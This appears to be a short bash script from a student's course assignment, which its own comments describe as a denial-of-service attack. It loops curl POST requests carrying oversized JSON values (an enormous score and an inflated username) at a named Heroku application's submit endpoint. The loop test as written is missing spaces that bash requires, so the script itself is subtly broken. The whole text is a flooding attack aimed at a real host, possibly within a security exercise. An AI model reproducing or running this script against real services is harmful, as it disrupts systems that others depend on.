#!/bin/bash 
# George Brown, Comp 20 Assignment 5
# Used for a DOS attack
# Thanks to Siddhartha Prasad for helping me with this script
i=0 
while [$i -lt 50000] 
do 
curl --data '{"username":"overflowing!!!!!!!!!!!!", "score":"999999999999999999999999999999999999999999999999999999", "grid":"xxxxxxxxxxxxxxx"}' http://sleepy-atoll-6532.herokuapp.com/submit.json -H "Content-Type: application/json" 
i=$(($i+1))
done